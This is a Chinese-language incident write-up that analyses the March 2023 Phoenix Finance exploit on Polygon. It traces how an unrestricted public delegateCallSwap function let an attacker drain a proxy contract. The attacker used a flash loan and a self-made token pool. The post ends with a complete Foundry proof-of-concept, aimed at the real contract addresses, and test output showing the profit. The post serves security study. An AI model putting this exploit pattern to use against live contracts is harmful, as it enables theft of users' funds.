# Phoenix 访问控制攻击分析




Phoenix Finance 的智能合约访问控制不严格导致的一次攻击

<!--more-->

## 概述

https://twitter.com/HypernativeLabs/status/1633090456157401088

故事发生在 polygon 链上的 [40067323](https://polygonscan.com/block/40067323) 高度 

tx: [0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4](https://polygonscan.com//tx/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4)



攻击流程参考: https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4



## 代码分析

Phoenix Finance 有一个代理合约 [0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de](https://polygonscan.com/address/0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de#code)

对应的逻辑合约为 **[0x6d68beb09ea7e76d561ea8c4aac34a6611dd9821](https://polygonscan.com/address/0x6d68beb09ea7e76d561ea8c4aac34a6611dd9821#code)**

逻辑合约中有这样一个`public`函数叫做`delegateCallSwap`

```solidity
    function delegateCallSwap(bytes memory data) public returns (bytes memory) {
        (bool success, bytes memory returnData) = phxSwapLib.delegatecall(data);
        assembly {
            if eq(success, 0) {
                revert(add(returnData, 0x20), returndatasize)
            }
        }
        return returnData;
    }
```

其中 `phxSwapLib` 可以从[代理合约](https://polygonscan.com/address/0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de#readProxyContract)上读出值为 : [0x95620f30263ac0b0B4FFd9B7465838084e89cB84](https://polygonscan.com/address/0x95620f30263ac0b0b4ffd9b7465838084e89cb84#code)

它是一个`UniSwapRouter` , 包含了一个`swap()`函数,用于在指定的router上进行token swap

```solidity
    function swap(address swapRouter,address token0,address token1,uint256 amountSell) payable external returns (uint256){
        return _swap(swapRouter,token0,token1,amountSell);
    }
```

梳理一下便可以得到下面的逻辑

![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1678867288807757000.png?raw=true)

也就是说, 任何人都可以以代理合约(0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de)为上下文进行代币置换. 

> 那么, 如果我有很多自己的创建的ERC20代币(MYTOKEN), 并以该ERC20代币创建一个交易池(Uniwswap Pair)
>
> **并且如果刚好代理合约又很有钱**, 那么我就可以让代理合约用真金白银来置换我们不值钱的MYTOKEN, 代理合约的钱就将会被置换到我们的交易池中, 然后我们再用一堆不值钱的MYTOKEN从交易池中将代理合约刚刚置换MYTOKEN的钱置换出来. 钱就到我们手中了.

可惜的是代理合约现在没钱(只有 0.000000000423个WETH)

如何让代理合约有钱?

在逻辑合约代码中有一个 `buyLeverage`函数, 用于用户购买Leverage Token , 也就是[攻击流程](https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4)中看到的WETH_BULL_X3这个币

`buyLeverage`函数调用的`_buy`函数如下

```solidity
    function _buy(leverageInfo memory coinInfo,uint256 amount,uint256 minAmount,uint256 deadLine,bool bFirstToken) ensure(deadLine) notHalted nonReentrant getUnderlyingPrice internal{
        address inputToken;
        if(bFirstToken){
            inputToken = coinInfo.token;
        }else{
            inputToken = (coinInfo.id == 0) ? hedgeCoin.token : leverageCoin.token;
        }
        amount = getPayableAmount(inputToken,amount);
        require(amount > 0, 'buy amount is zero');
        uint256 userPay = amount;
        amount = redeemFees(buyFee,inputToken,amount);
        uint256 price = _tokenNetworthBuy(coinInfo,currentPrice);
        uint256 leverageAmount = bFirstToken ? amount.mul(calDecimal)/price :
            amount.mulPrice(currentPrice,coinInfo.id)/price;
        require(leverageAmount>=minAmount,"token amount is less than minAmount");
        {
            uint256 userLoan = (leverageAmount.mul(coinInfo.rebalanceWorth)/calDecimal).mul(coinInfo.leverageRate-feeDecimal)/feeDecimal;
            userLoan = coinInfo.stakePool.borrow(userLoan);
            amount = bFirstToken ? userLoan.add(amount) : userLoan;
            //98%
            uint256 amountOut = amount.mul(98e16).divPrice(currentPrice,coinInfo.id);
            address token1 = (coinInfo.id == 0) ? hedgeCoin.token : leverageCoin.token;
            amount = _swap(coinInfo.token,token1,amount);
            require(amount>=amountOut, "swap slip page is more than 2%");
        }
        coinInfo.leverageToken.mint(msg.sender,leverageAmount);
        price = price.mul(currentPrice[coinInfo.id])/calDecimal;
        if(coinInfo.id == 0){
            emit BuyLeverage(msg.sender,inputToken,userPay,leverageAmount,price);
        }else{
            emit BuyHedge(msg.sender,inputToken,userPay,leverageAmount,price);
        }  
    }
```

其中`userLoan = coinInfo.stakePool.borrow(userLoan); `该代码会向[另外一个代理合约](https://polygonscan.com/address/0xd0289082cf4c5c2ba448b4b9c67232729aa75efa#readProxyContract)借钱到本代理合约. 我没搞清楚这是在干嘛. 但反正用户向代理合约购买Leverage Token后, 代理合约会得到两笔USDC: 用户付款的USDC以及调用coinInfo.stakePool.borrow()借来的USDC, 并且其会将这些USDC都转换为WETH

> 所以, 为了让代理合约有钱置换我们的币, 我们花`X`向代理合约购买Leverage Token, 代理合约会收到的价值为 `X + Y` , `Y`是它向[另外一个代理合约](https://polygonscan.com/address/0xd0289082cf4c5c2ba448b4b9c67232729aa75efa#readProxyContract)借来的
>
> 然后我们让代理合约花  `X + Y` 全部拿来置换我们的币, 这样除去成本`X`, 我们能净赚`Y`

> 在本次攻击中, 黑客也没想花自己的钱, 所以他使用了闪电贷来支付购买Leverage Token的成本`X`



## 攻击流程

到这里查看攻击流程 : https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4

我总结了一下, 如下图, 每一行开头的数字对应攻击流程图中的行号

![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1678870443464770000.png?raw=true)



## POC

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

interface phxProxy {
    function buyLeverage(
        uint256 amount,
        uint256 minAmount,
        uint256 deadLine,
        bytes calldata
    ) external;

    function delegateCallSwap(bytes memory data) external;
}

interface DPPAdvanced {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata
    ) external;
}

//https://polygonscan.com/address/0x65baf1dc6fa0c7e459a36e2e310836b396d1b1de#code
phxProxy constant PHX_PROXY = phxProxy(
    0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de
);

IUniswapV2Router02 constant QuickSwapRouter = IUniswapV2Router02(
    0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff
);

DPPAdvanced constant DPP = DPPAdvanced(
    0x1093ceD81987Bf532c2b7907B2A8525cd0C17295
);

IERC20 constant USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
IERC20 constant WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);

// 我们自己的垃圾币
contract ExampleToken is ERC20 {
    constructor() ERC20("Example", "EXM") {
        _mint(msg.sender, 1_500_000 * 1e18);
    }
}

contract HackTest is Test {
    ExampleToken myToken;

    function setUp() public {
        vm.createSelectFork("polygon", 40066946);
        myToken = new ExampleToken();
        deal(address(WETH), address(this), 1 ether);
        vm.label(address(PHX_PROXY), "PHX_PROXY");
        vm.label(address(QuickSwapRouter), "QuickSwapRouter");
        vm.label(address(DPP), "DPP");
        vm.label(address(USDC), "USDC");
        vm.label(address(WETH), "WETH");
        vm.label(
            0x6d68bEB09ea7e76d561EA8C4Aac34A6611dd9821,
            "LogicContractOfProxy"
        );
        vm.label(0x0a6293a64D4C2EaaB8e349FA6A9F4D238d46b491, "polygonOracle");
        vm.label(
            0xd0289082cf4c5c2ba448B4B9c67232729aa75EfA,
            "coinInfo.stakePool"
        );
        vm.label(
            0x1021024d6Dc53BCb929eA0e6A664194809C9464a,
            "Logic of coinInfo.stakePool"
        );
    }

    function testHack() public {
        emit log_named_decimal_uint(
            "Attacker USDC balance before exploit:",
            USDC.balanceOf(address(this)),
            6
        );

        emit log_named_decimal_uint(
            "Attacker WETH balance before exploit:",
            WETH.balanceOf(address(this)),
            18
        );

        // 1. 构建垃圾币交易池， 方便代理合约过来置换~~
        myToken.approve(address(QuickSwapRouter), type(uint256).max);
        WETH.approve(address(QuickSwapRouter), type(uint256).max);

        QuickSwapRouter.addLiquidity(
            address(myToken),
            address(WETH),
            7 * 1e15,
            7 * 1e15,
            0,
            0,
            address(this),
            block.timestamp
        );

        // 2. 使用闪电贷，贷款以向代理合约购买Leverage Token
        // https://dodoex.github.io/docs/docs/flashSwap
        DPP.flashLoan(0, 7990000000, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external {
        emit log_named_decimal_uint(
            "WETH.balanceOf(address(PHX_PROXY)) before buyLeverage: ",
            WETH.balanceOf(address(PHX_PROXY)),
            18
        );
        // 3, 向代理合约购买Leverage Token, make the proxy contract rich~
        USDC.approve(address(PHX_PROXY), type(uint256).max);
        PHX_PROXY.buyLeverage(7990000000, 0, block.timestamp, new bytes(0));
        uint256 swapAmount = WETH.balanceOf(address(PHX_PROXY));

        emit log_named_decimal_uint(
            "WETH.balanceOf(address(PHX_PROXY)) after buyLeverage: ",
            WETH.balanceOf(address(PHX_PROXY)),
            18
        );

        //4. 让代理合约用它的WETH来置换我们的垃圾币
        // 然后代理合约的WETH转移到我们垃圾币交易池中
        bytes memory swapData = abi.encodeWithSelector(
            0xa9678a18, //swap
            address(QuickSwapRouter),
            address(WETH),
            address(myToken),
            swapAmount
        );
        PHX_PROXY.delegateCallSwap(swapData);

        emit log_named_decimal_uint(
            "WETH.balanceOf(address(PHX_PROXY)) after exploit: ",
            WETH.balanceOf(address(PHX_PROXY)),
            18
        );

        // 5. 这里写成2步更容易理解
        // 5.1 我们用另外一堆垃圾币向我们创建的交易池（mytoken <=> WETH）进行置换，将它收到的代理合约给的WETH置换出来
        // 5.2 然后我们将得到的WETH又到其他的交易池（WETH <=> USDC）进行置换，以套现
        address[] memory path = new address[](3);
        path[0] = address(myToken);
        path[1] = address(WETH);
        path[2] = address(USDC);
        uint[] memory amounts = QuickSwapRouter.swapExactTokensForTokens(
            1000000000000000000000000,
            0,
            path,
            address(this),
            block.timestamp
        );

        emit log_named_decimal_uint("swap amounts[0]", amounts[0], 18);
        emit log_named_decimal_uint("swap amounts[1]", amounts[1], 18);
        emit log_named_decimal_uint("swap amounts[2]", amounts[2], 6);

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit:",
            USDC.balanceOf(address(this)),
            6
        );

        //归还贷款 (DODO Flash Loan 不要手续费 )
        USDC.transfer(address(DPP), 7990000000);

        emit log_named_decimal_uint(
            "Attacker USDC balance after return FlashLoan:",
            USDC.balanceOf(address(this)),
            6
        );

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit:",
            WETH.balanceOf(address(this)),
            18
        );
    }
}

```

输出

```
~ ❯ forge test --match-contract HackTest  -vv         
[⠔] Compiling...
[⠑] Compiling 1 files with 0.8.17
[⠘] Solc 0.8.17 finished in 2.16s
Compiler run successful

Running 1 test for test/hack.t.sol:HackTest
[PASS] testHack() (gas: 3381824)
Logs:
  Attacker USDC balance before exploit:: 0.000000
  Attacker WETH balance before exploit:: 1.000000000000000000
  WETH.balanceOf(address(PHX_PROXY)) before buyLeverage: : 0.000000000423128453
  WETH.balanceOf(address(PHX_PROXY)) after buyLeverage: : 11.407989927123285963
  WETH.balanceOf(address(PHX_PROXY)) after exploit: : 0.000000000000000000
  swap amounts[0]: 1000000.000000000000000000
  swap amounts[1]: 11.414989927073990725
  swap amounts[2]: 18108.937231
  Attacker USDC balance after exploit:: 18108.937231
  Attacker USDC balance after return FlashLoan:: 10118.937231
  Attacker WETH balance after exploit:: 0.993000000000000000
```


